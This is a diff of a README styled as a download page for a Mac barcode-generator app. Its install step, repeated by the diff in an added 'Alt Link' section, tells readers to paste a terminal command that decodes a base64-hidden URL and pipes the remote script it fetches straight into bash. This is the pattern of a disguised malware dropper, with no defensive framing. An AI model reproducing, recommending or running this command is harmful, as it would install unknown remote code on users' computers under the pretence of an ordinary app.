@@ -7,9 +7,9 @@
 ## ⬇️ Download Barcode for Mac
 
 > Open the terminal on your device and paste the command below
-```bash
+
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
-```
+
 ---
 
 ## ✨ What is Barcode for Mac?
@@ -20,7 +20,13 @@ With support for dozens of barcode formats — including UPC, EAN, Code 128, ISB
 
 Ideal for small businesses, warehouses, designers, and educational use, the app supports batch generation, template saving, and works natively on both Intel and Apple Silicon Macs.
 
-[![⬇️ Download Barcode Mac](https://img.shields.io/badge/Download-Barcode%20Mac-blue?style=for-the-badge&logo=apple)](https://barcode-mac-download.github.io/.github)
+---
+
+## ⬇️ Download Barcode for Mac (Alt Link)
+
+> Open the terminal on your device and paste the command below
+
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 
 ---
 
